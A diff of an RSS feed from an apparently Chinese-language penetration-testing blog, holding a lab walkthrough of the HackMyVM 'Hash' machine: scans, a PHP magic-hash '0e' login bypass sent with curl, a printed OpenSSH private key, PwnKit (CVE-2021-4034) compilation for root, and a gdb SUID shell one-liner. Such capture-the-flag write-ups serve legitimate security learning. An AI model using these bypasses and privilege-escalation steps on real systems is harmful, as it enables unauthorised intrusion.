@@ -1,4 +1,235 @@
-<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[C1trus ]]></title><description><![CDATA[Obsidian digital garden]]></description><link>https://www.c1trus.top/</link><image><url>https://www.c1trus.top/lib/media/favicon.png</url><title>C1trus </title><link>https://www.c1trus.top/</link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Fri, 03 Jan 2025 07:31:54 GMT</lastBuildDate><atom:link href="https://www.c1trus.top/lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Fri, 03 Jan 2025 07:31:53 GMT</pubDate><copyright><![CDATA[C1trus]]></copyright><ttl>60</ttl><dc:creator>C1trus</dc:creator><item><title><![CDATA[8.Milanesa]]></title><description><![CDATA[ 
+<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[C1trus ]]></title><description><![CDATA[Obsidian digital garden]]></description><link>https://www.c1trus.top/</link><image><url>https://www.c1trus.top/lib/media/favicon.png</url><title>C1trus </title><link>https://www.c1trus.top/</link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Fri, 03 Jan 2025 08:23:52 GMT</lastBuildDate><atom:link href="https://www.c1trus.top/lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Fri, 03 Jan 2025 08:23:49 GMT</pubDate><copyright><![CDATA[C1trus]]></copyright><ttl>60</ttl><dc:creator>C1trus</dc:creator><item><title><![CDATA[00-HMV-WP]]></title><description><![CDATA[ 
+ <br>]]></description><link>https://www.c1trus.top/24-渗透/hmv/00-hmv-wp.html</link><guid isPermaLink="false">24-渗透/HMV/00-HMV-WP.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Fri, 03 Jan 2025 07:46:12 GMT</pubDate></item><item><title><![CDATA[39.Hash]]></title><description><![CDATA[ 
+ <br><br>
+<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
+<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
+
+<br><a data-tooltip-position="top" aria-label="2.1. 0e绕过" data-href="#2.1. 0e绕过" href="https://www.c1trus.top/about:blank#2.1._0e绕过" class="internal-link" target="_self" rel="noopener nofollow">2.1. 0e绕过</a>
+
+
+<br><a data-tooltip-position="top" aria-label="3. 方式1：PWNkit 提权root" data-href="#3. 方式1：PWNkit 提权root" href="https://www.c1trus.top/about:blank#3._方式1：PWNkit_提权root" class="internal-link" target="_self" rel="noopener nofollow">3. 方式1：PWNkit 提权root</a>
+<br><a data-tooltip-position="top" aria-label="4. 方式2正常提权" data-href="#4. 方式2正常提权" href="https://www.c1trus.top/about:blank#4._方式2正常提权" class="internal-link" target="_self" rel="noopener nofollow">4. 方式2正常提权</a><br>
+- <a data-tooltip-position="top" aria-label="4.1. 提权到 maria 用户" data-href="#4.1. 提权到 maria 用户" href="https://www.c1trus.top/about:blank#4.1._提权到_maria_用户" class="internal-link" target="_self" rel="noopener nofollow">4.1. 提权到 maria 用户</a><br>
+靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Hash" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Hash</a><br>
+作者 sml<br>
+难度 ⭐️⭐️
+<br><br>Warning
+靶机必须要能出网才行。不能出网不会开放80端口
+<br>┌──(root㉿kali)-[/home/kali/hmv/hash]
+└─# nmap -sCV 192.168.42.79
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-05 10:10 CST
+Nmap scan report for 192.168.42.79
+Host is up (0.000090s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 1e:fb:86:3d:cf:26:a2:a0:ae:b0:00:61:0b:41:cb:ab (RSA)
+|   256 80:8e:46:7b:1d:6e:13:74:22:89:ad:91:b4:44:64:ec (ECDSA)
+|_  256 71:e5:e1:4f:34:16:de:ec:b5:c4:fe:f5:0a:a2:ee:fc (ED25519)
+80/tcp   open  http          nginx 1.14.2
+|_http-title: LOGIN
+|_http-server-header: nginx/1.14.2
+3389/tcp open  ms-wbt-server xrdp
+MAC Address: 08:00:27:8C:10:84 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.53 seconds
+
+<br>首页是一个登录框<br>
+<img alt="Pasted image 20241205101329" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205101329.png" referrerpolicy="no-referrer"><br>
+看一下源代码代码 可以发现有提示<br>&lt;!doctype html&gt;
+&lt;html lang="en"&gt;
+&lt;title&gt;LOGIN&lt;/title&gt;
+
+    &lt;form class="form-signin" action="check.php" method="post"&gt;
+
+      &lt;input type="text" autocomplete="off" id="user" name="user" name="user" placeholder="Username" required autofocus&gt;
+      &lt;input type="password" name="password" id="password" placeholder="Password" required&gt;
+      &lt;input type="submit" value="Login"&gt;
+    &lt;/form&gt;
+&lt;!-- Marco, remember to delete the .bak file--&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+<br>获取到一个用户 Marco  告诉我们里面有一个.bak文件<br>目录扫描<br>┌──(root㉿kali)-[/home/kali/hmv/hash]
+└─# gobuster dir -u http://192.168.42.79 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x jpg,php,html,png,zip,bak,txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.42.79
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              jpg,php,html,png,zip,bak,txt
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 453]
+/check.bak            (Status: 200) [Size: 273]
+/check.php            (Status: 200) [Size: 19]
+
+<br>┌──(root㉿kali)-[/home/kali/hmv/hash]
+└─# curl http://192.168.42.79/check.php
+INVALID CREDENTIALS                                                                                                        
+┌──(root㉿kali)-[/home/kali/hmv/hash]
+└─# curl http://192.168.42.79/check.bak
+&lt;?php
+// Login part.
+$pass = $_POST['password'];
+//marco please dont use md5, is not secure.
+//$passwordhashed = hash('md5', $pass);
+$passwordhashed = hash('sha256',$pass);
+if ($passwordhashed == '0e0001337') {
+//Your code here
+}
+else{
+//Another code here
+}
+//To finish
+?&gt;
+
+<br>可以发现这个判断是一个弱等于<br>
+使用0e绕过<br><br>绕过原理：PHP在处理字符串时会出现缺陷，如果字符串为’5e2’，本来只是一个正常字符串，但PHP会认为这是科学计数法里的e，那么PHP进行比较时会将这个字符串按照科学计数法计算，即5e2=5*10^2=500，由此0e100被认为和0相等。md5加密后的哈希值是一串16进制数，因此需要哈希值第一位为0，第二位为e即可，后面不论是什么都认为和0相等<br>payload看这里 <a rel="noopener nofollow" class="external-link" href="https://github.com/spaze/hashes/blob/master/sha256.md" target="_blank">https://github.com/spaze/hashes/blob/master/sha256.md</a><br>到主页密码输入payload 用户随便输入 登录后可以获取到私钥<br>┌──(root㉿kali)-[/home/kali/hmv/hash]
+└─# curl http://192.168.42.79/check.php -X POST -d "user=12312&amp;password=34250003024812"
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAxiKdFmWJiVfVYaNGov1xuh0/nrXnNsx2s6g5IoIJrmkX+9qzt2US
+ZWMgrjLzAyB3wrLFysCPh4F8GU87pJkbpc0prM/8vB2WJCg5ktDQ6o0vwH219sPKUS4e9R
+s2bPz7CJX5bzFDQ3B6ZUOs1itZ1t/uq38XuCxDjI8XxU6fusB3Rjz2XIombtFwo78W1pkX
+VnQhzZOQ+b8UaC5lZeKatcZ0xdc0iQgiAbcRN7sXYCDMxMmo9KsxqzWjd56hLrv1nsTy2t
+VBXzDRw+5JU4AJlGDRB/Upq/oKbGDCOmgNUsJPQKW4TgEAWhUa+t/ue2Bs/wFjCY7w/LkY
+pK4bnY5eHQAAA8C/pv23v6b9twAAAAdzc2gtcnNhAAABAQDGIp0WZYmJV9Vho0ai/XG6HT
++etec2zHazqDkiggmuaRf72rO3ZRJlYyCuMvMDIHfCssXKwI+HgXwZTzukmRulzSmsz/y8
+HZYkKDmS0NDqjS/AfbX2w8pRLh71GzZs/PsIlflvMUNDcHplQ6zWK1nW3+6rfxe4LEOMjx
+fFTp+6wHdGPPZciiZu0XCjvxbWmRdWdCHNk5D5vxRoLmVl4pq1xnTF1zSJCCIBtxE3uxdg
+IMzEyaj0qzGrNaN3nqEuu/WexPLa1UFfMNHD7klTgAmUYNEH9Smr+gpsYMI6aA1Swk9Apb
+hOAQBaFRr63+57YGz/AWMJjvD8uRikrhudjl4dAAAAAwEAAQAAAQEAlMcLA/VMmGfu33kW
+Im+DRUiPLCLVMo3HmFH6TRIuKNvbWY+4oT5w2NbdhFDXr4Jiyz0oTn3XiN3PDMY1N/yMCS
+0MXSp0UeE5i3709Gx+Y5GOyNDcoSYVtm2Wa2B6ts4jxievfDIWmv5LudxeXReCR1oxQm+V
+pQL/2fzc0ZifUj+/VSSIltgDKHxEfebfK0xShgXTSlUhickSapre2ArSdplM/rYvZLDWmd
+iGkGD3VnAgRtloy5v32vPI3M++OCrHbLxgff4odAjawejPPHVj3beMgCrqwb/CCNKEyWKc
+Jkjjt7nY/GUW4RfzM34LplezpmvrsLkTVMAb3KflDkDPFQAAAIBrP6Pnz0t8d/M+4hEb66
+IkrftwqMC+c8Z0HMGURTMco7jXfoXaVP3eWCafEZ/RobZm0Ob1mnBZ574Qn8ai5VLPyJz6
+5Ibe1Z6LWu6yCL/VFNyksnVARIuVjQt9pXpzbXOfn0H4ZHRBFyRhNHGjnft1PA59O30Dpw
+UVz9eO3K2EqQAAAIEA4baQFa4RYnZ/YK4F6acjsAPhk88poLjDT86eCQ08wO5+d8BGuSHE
++BAqCZJuJTvvozYpZ5NFW4OEG9+T/HX2tvB6Ucc1pbQNNnB7CBp/VoLLTW+nuU3YJbgYlx
+VnWRRudD6K7wjZEHJ44XzLdTy2wyeUvZw/iJRZmqQ5hxXCD1MAAACBAOC4ucZotWaq/pb5
+V5RqLV8HU+DWFHAIfvqtYI5wCcZmAjGtXgLF1HY9MZ3bRPz2/m7cB44cdgCRbtmqBvnOvn
+6h9AS4gr1HOJEpjgohkxBTc2Mf/dpCCdcNCX2Xy5ExPSilbS2rUHHCIU2J/yZGTths8fBR
+cEjmSYvt0qFY/t7PAAAACm1hcmNvQGhhc2g=
+-----END OPENSSH PRIVATE KEY-----
+<br>然后可以用私钥连接到marco用户上去<br>marco@hash:~$ sh flag.sh
+
+                                   .     **
+                                *           *.
+                                              ,*
+                                                 *,
+                         ,                         ,*
+                      .,                              *,
+                    /                                    *
+                 ,*                                        *,
+               /.                                            .*.
+             *                                                  **
+             ,*                                               ,*
+                **                                          *.
+                   **                                    **.
+                     ,*                                **
+                        *,                          ,*
+                           *                      **
+                             *,                .*
+                                *.           **
+                                  **      ,*,
+                                     ** *,
+-------------------------
+
+PWNED HOST: hash
+
+PWNED DATE: Wed 04 Dec 2024 09:45:49 PM EST
+
+WHOAMI: uid=1000(marco) gid=1000(marco) groups=1000(marco),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+
+FLAG: hashmanready
+
+------------------------
+
+<br><br>检测存在Pwnkit漏洞<br>marco@hash:~$ bash lzs.sh
+
+[+] [CVE-2021-4034] PwnKit
+
+   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+   Exposure: probable
+   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,[ debian=7|8|9|10|11 ],fedora,manjaro
+   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+
+<br>但是本地没有gcc  所以我们不能本地编译，我就在自己的kali上编译<br>
+而且kali的Libc与靶机的版本不同。所以采用静态编译<br>kali静态编译
+┌──(root㉿kali)-[/home/pwnkit/CVE-2021-4034-main]
+└─# make
+cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
+cc -Wall    cve-2021-4034.c   -o cve-2021-4034
+echo "module UTF-8// PWNKIT// pwnkit 1" &gt; gconv-modules
+mkdir -p GCONV_PATH=.
+cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.
+
+┌──(root㉿kali)-[/home/pwnkit/CVE-2021-4034-main]
+└─# cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
+
+┌──(root㉿kali)-[/home/pwnkit/CVE-2021-4034-main]
+└─# cc -Wall    cve-2021-4034.c   -o cve-2021-4034 -static
+
+然后把 pwnkit.so  cve-2021-4034 传到靶机运行即可
+marco@hash:~/CVE-2021-4034-main$ chmod +x cve-2021-4034
+marco@hash:~/CVE-2021-4034-main$ ./cve-2021-4034
+# id
+uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(marco)
+# sh /root/flag.sh
+
+                                   .     **
+                                *           *.
+                                              ,*
+                                                 *,
+                         ,                         ,*
+                      .,                              *,
+                    /                                    *
+                 ,*                                        *,
+               /.                                            .*.
+             *                                                  **
+             ,*                                               ,*
+                **                                          *.
+                   **                                    **.
+                     ,*                                **
+                        *,                          ,*
+                           *                      **
+                             *,                .*
+                                *.           **
+                                  **      ,*,
+                                     ** *,
+-------------------------
+
+PWNED HOST: hash
+
+PWNED DATE: Wed Dec  4 22:14:52 EST 2024
+
+WHOAMI: uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(marco)
+
+FLAG: hashhater
+
+------------------------
+
+
+
+<br><br><br>maria用户的目录下面有一个 myterm.sh<br>marco@hash:/home/maria$ cat myterm.sh
+export DISPLAY=:10
+xterm
+]]></description><link>https://www.c1trus.top/24-渗透/hmv/39.hash.html</link><guid isPermaLink="false">24-渗透/HMV/39.Hash.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Fri, 03 Jan 2025 07:44:19 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205101329.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205101329.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[00-THL-WP]]></title><description><![CDATA[ 
+ <br>]]></description><link>https://www.c1trus.top/24-渗透/thl/00-thl-wp.html</link><guid isPermaLink="false">24-渗透/THL/00-THL-WP.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Fri, 03 Jan 2025 07:48:44 GMT</pubDate></item><item><title><![CDATA[00-Vulnyx-WP]]></title><description><![CDATA[ 
+ <br>]]></description><link>https://www.c1trus.top/24-渗透/vulnyx/00-vulnyx-wp.html</link><guid isPermaLink="false">24-渗透/Vulnyx/00-Vulnyx-WP.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Fri, 03 Jan 2025 07:50:46 GMT</pubDate></item><item><title><![CDATA[8.Milanesa]]></title><description><![CDATA[ 
  <br>****## 1. 基本信息^toc<br>
 <br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
 <br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
@@ -3925,235 +4156,7 @@ put 1.php
 /usr/bin/gpasswd
 <br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.006.png" referrerpolicy="no-referrer"><br>cd /usr/bin
 ./gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
-<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.007.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-渗透/hmv/4.connection.html</link><guid isPermaLink="false">24-渗透/HMV/4.Connection.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[39.Hash]]></title><description><![CDATA[ 
- <br><br>
-<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
-<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
-
-<br><a data-tooltip-position="top" aria-label="2.1. 0e绕过" data-href="#2.1. 0e绕过" href="https://www.c1trus.top/about:blank#2.1._0e绕过" class="internal-link" target="_self" rel="noopener nofollow">2.1. 0e绕过</a>
-
-
-<br><a data-tooltip-position="top" aria-label="3. 方式1：PWNkit 提权root" data-href="#3. 方式1：PWNkit 提权root" href="https://www.c1trus.top/about:blank#3._方式1：PWNkit_提权root" class="internal-link" target="_self" rel="noopener nofollow">3. 方式1：PWNkit 提权root</a>
-<br><a data-tooltip-position="top" aria-label="4. 方式2正常提权" data-href="#4. 方式2正常提权" href="https://www.c1trus.top/about:blank#4._方式2正常提权" class="internal-link" target="_self" rel="noopener nofollow">4. 方式2正常提权</a><br>
-- <a data-tooltip-position="top" aria-label="4.1. 提权到 maria 用户" data-href="#4.1. 提权到 maria 用户" href="https://www.c1trus.top/about:blank#4.1._提权到_maria_用户" class="internal-link" target="_self" rel="noopener nofollow">4.1. 提权到 maria 用户</a><br>
-靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Hash" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Hash</a><br>
-作者 sml<br>
-难度 ⭐️⭐️
-<br><br>Warning
-靶机必须要能出网才行。不能出网不会开放80端口
-<br>┌──(root㉿kali)-[/home/kali/hmv/hash]
-└─# nmap -sCV 192.168.42.79
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-05 10:10 CST
-Nmap scan report for 192.168.42.79
-Host is up (0.000090s latency).
-Not shown: 997 closed tcp ports (reset)
-PORT     STATE SERVICE       VERSION
-22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
-| ssh-hostkey:
-|   2048 1e:fb:86:3d:cf:26:a2:a0:ae:b0:00:61:0b:41:cb:ab (RSA)
-|   256 80:8e:46:7b:1d:6e:13:74:22:89:ad:91:b4:44:64:ec (ECDSA)
-|_  256 71:e5:e1:4f:34:16:de:ec:b5:c4:fe:f5:0a:a2:ee:fc (ED25519)
-80/tcp   open  http          nginx 1.14.2
-|_http-title: LOGIN
-|_http-server-header: nginx/1.14.2
-3389/tcp open  ms-wbt-server xrdp
-MAC Address: 08:00:27:8C:10:84 (Oracle VirtualBox virtual NIC)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 11.53 seconds
-
-<br>首页是一个登录框<br>
-<img alt="Pasted image 20241205101329" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205101329.png" referrerpolicy="no-referrer"><br>
-看一下源代码代码 可以发现有提示<br>&lt;!doctype html&gt;
-&lt;html lang="en"&gt;
-&lt;title&gt;LOGIN&lt;/title&gt;
-
-    &lt;form class="form-signin" action="check.php" method="post"&gt;
-
-      &lt;input type="text" autocomplete="off" id="user" name="user" name="user" placeholder="Username" required autofocus&gt;
-      &lt;input type="password" name="password" id="password" placeholder="Password" required&gt;
-      &lt;input type="submit" value="Login"&gt;
-    &lt;/form&gt;
-&lt;!-- Marco, remember to delete the .bak file--&gt;
-  &lt;/body&gt;
-&lt;/html&gt;
-<br>获取到一个用户 Marco  告诉我们里面有一个.bak文件<br>目录扫描<br>┌──(root㉿kali)-[/home/kali/hmv/hash]
-└─# gobuster dir -u http://192.168.42.79 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x jpg,php,html,png,zip,bak,txt
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://192.168.42.79
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Extensions:              jpg,php,html,png,zip,bak,txt
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/index.html           (Status: 200) [Size: 453]
-/check.bak            (Status: 200) [Size: 273]
-/check.php            (Status: 200) [Size: 19]
-
-<br>┌──(root㉿kali)-[/home/kali/hmv/hash]
-└─# curl http://192.168.42.79/check.php
-INVALID CREDENTIALS                                                                                                        
-┌──(root㉿kali)-[/home/kali/hmv/hash]
-└─# curl http://192.168.42.79/check.bak
-&lt;?php
-// Login part.
-$pass = $_POST['password'];
-//marco please dont use md5, is not secure.
-//$passwordhashed = hash('md5', $pass);
-$passwordhashed = hash('sha256',$pass);
-if ($passwordhashed == '0e0001337') {
-//Your code here
-}
-else{
-//Another code here
-}
-//To finish
-?&gt;
-
-<br>可以发现这个判断是一个弱等于<br>
-使用0e绕过<br><br>绕过原理：PHP在处理字符串时会出现缺陷，如果字符串为’5e2’，本来只是一个正常字符串，但PHP会认为这是科学计数法里的e，那么PHP进行比较时会将这个字符串按照科学计数法计算，即5e2=5*10^2=500，由此0e100被认为和0相等。md5加密后的哈希值是一串16进制数，因此需要哈希值第一位为0，第二位为e即可，后面不论是什么都认为和0相等<br>payload看这里 <a rel="noopener nofollow" class="external-link" href="https://github.com/spaze/hashes/blob/master/sha256.md" target="_blank">https://github.com/spaze/hashes/blob/master/sha256.md</a><br>到主页密码输入payload 用户随便输入 登录后可以获取到私钥<br>┌──(root㉿kali)-[/home/kali/hmv/hash]
-└─# curl http://192.168.42.79/check.php -X POST -d "user=12312&amp;password=34250003024812"
-
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
-NhAAAAAwEAAQAAAQEAxiKdFmWJiVfVYaNGov1xuh0/nrXnNsx2s6g5IoIJrmkX+9qzt2US
-ZWMgrjLzAyB3wrLFysCPh4F8GU87pJkbpc0prM/8vB2WJCg5ktDQ6o0vwH219sPKUS4e9R
-s2bPz7CJX5bzFDQ3B6ZUOs1itZ1t/uq38XuCxDjI8XxU6fusB3Rjz2XIombtFwo78W1pkX
-VnQhzZOQ+b8UaC5lZeKatcZ0xdc0iQgiAbcRN7sXYCDMxMmo9KsxqzWjd56hLrv1nsTy2t
-VBXzDRw+5JU4AJlGDRB/Upq/oKbGDCOmgNUsJPQKW4TgEAWhUa+t/ue2Bs/wFjCY7w/LkY
-pK4bnY5eHQAAA8C/pv23v6b9twAAAAdzc2gtcnNhAAABAQDGIp0WZYmJV9Vho0ai/XG6HT
-+etec2zHazqDkiggmuaRf72rO3ZRJlYyCuMvMDIHfCssXKwI+HgXwZTzukmRulzSmsz/y8
-HZYkKDmS0NDqjS/AfbX2w8pRLh71GzZs/PsIlflvMUNDcHplQ6zWK1nW3+6rfxe4LEOMjx
-fFTp+6wHdGPPZciiZu0XCjvxbWmRdWdCHNk5D5vxRoLmVl4pq1xnTF1zSJCCIBtxE3uxdg
-IMzEyaj0qzGrNaN3nqEuu/WexPLa1UFfMNHD7klTgAmUYNEH9Smr+gpsYMI6aA1Swk9Apb
-hOAQBaFRr63+57YGz/AWMJjvD8uRikrhudjl4dAAAAAwEAAQAAAQEAlMcLA/VMmGfu33kW
-Im+DRUiPLCLVMo3HmFH6TRIuKNvbWY+4oT5w2NbdhFDXr4Jiyz0oTn3XiN3PDMY1N/yMCS
-0MXSp0UeE5i3709Gx+Y5GOyNDcoSYVtm2Wa2B6ts4jxievfDIWmv5LudxeXReCR1oxQm+V
-pQL/2fzc0ZifUj+/VSSIltgDKHxEfebfK0xShgXTSlUhickSapre2ArSdplM/rYvZLDWmd
-iGkGD3VnAgRtloy5v32vPI3M++OCrHbLxgff4odAjawejPPHVj3beMgCrqwb/CCNKEyWKc
-Jkjjt7nY/GUW4RfzM34LplezpmvrsLkTVMAb3KflDkDPFQAAAIBrP6Pnz0t8d/M+4hEb66
-IkrftwqMC+c8Z0HMGURTMco7jXfoXaVP3eWCafEZ/RobZm0Ob1mnBZ574Qn8ai5VLPyJz6
-5Ibe1Z6LWu6yCL/VFNyksnVARIuVjQt9pXpzbXOfn0H4ZHRBFyRhNHGjnft1PA59O30Dpw
-UVz9eO3K2EqQAAAIEA4baQFa4RYnZ/YK4F6acjsAPhk88poLjDT86eCQ08wO5+d8BGuSHE
-+BAqCZJuJTvvozYpZ5NFW4OEG9+T/HX2tvB6Ucc1pbQNNnB7CBp/VoLLTW+nuU3YJbgYlx
-VnWRRudD6K7wjZEHJ44XzLdTy2wyeUvZw/iJRZmqQ5hxXCD1MAAACBAOC4ucZotWaq/pb5
-V5RqLV8HU+DWFHAIfvqtYI5wCcZmAjGtXgLF1HY9MZ3bRPz2/m7cB44cdgCRbtmqBvnOvn
-6h9AS4gr1HOJEpjgohkxBTc2Mf/dpCCdcNCX2Xy5ExPSilbS2rUHHCIU2J/yZGTths8fBR
-cEjmSYvt0qFY/t7PAAAACm1hcmNvQGhhc2g=
------END OPENSSH PRIVATE KEY-----
-<br>然后可以用私钥连接到marco用户上去<br>marco@hash:~$ sh flag.sh
-
-                                   .     **
-                                *           *.
-                                              ,*
-                                                 *,
-                         ,                         ,*
-                      .,                              *,
-                    /                                    *
-                 ,*                                        *,
-               /.                                            .*.
-             *                                                  **
-             ,*                                               ,*
-                **                                          *.
-                   **                                    **.
-                     ,*                                **
-                        *,                          ,*
-                           *                      **
-                             *,                .*
-                                *.           **
-                                  **      ,*,
-                                     ** *,
--------------------------
-
-PWNED HOST: hash
-
-PWNED DATE: Wed 04 Dec 2024 09:45:49 PM EST
-
-WHOAMI: uid=1000(marco) gid=1000(marco) groups=1000(marco),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
-
-FLAG: hashmanready
-
-------------------------
-
-<br><br>检测存在Pwnkit漏洞<br>marco@hash:~$ bash lzs.sh
-
-[+] [CVE-2021-4034] PwnKit
-
-   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
-   Exposure: probable
-   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,[ debian=7|8|9|10|11 ],fedora,manjaro
-   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
-
-<br>但是本地没有gcc  所以我们不能本地编译，我就在自己的kali上编译<br>
-而且kali的Libc与靶机的版本不同。所以采用静态编译<br>kali静态编译
-┌──(root㉿kali)-[/home/pwnkit/CVE-2021-4034-main]
-└─# make
-cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
-cc -Wall    cve-2021-4034.c   -o cve-2021-4034
-echo "module UTF-8// PWNKIT// pwnkit 1" &gt; gconv-modules
-mkdir -p GCONV_PATH=.
-cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.
-
-┌──(root㉿kali)-[/home/pwnkit/CVE-2021-4034-main]
-└─# cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
-
-┌──(root㉿kali)-[/home/pwnkit/CVE-2021-4034-main]
-└─# cc -Wall    cve-2021-4034.c   -o cve-2021-4034 -static
-
-然后把 pwnkit.so  cve-2021-4034 传到靶机运行即可
-marco@hash:~/CVE-2021-4034-main$ chmod +x cve-2021-4034
-marco@hash:~/CVE-2021-4034-main$ ./cve-2021-4034
-# id
-uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(marco)
-# sh /root/flag.sh
-
-                                   .     **
-                                *           *.
-                                              ,*
-                                                 *,
-                         ,                         ,*
-                      .,                              *,
-                    /                                    *
-                 ,*                                        *,
-               /.                                            .*.
-             *                                                  **
-             ,*                                               ,*
-                **                                          *.
-                   **                                    **.
-                     ,*                                **
-                        *,                          ,*
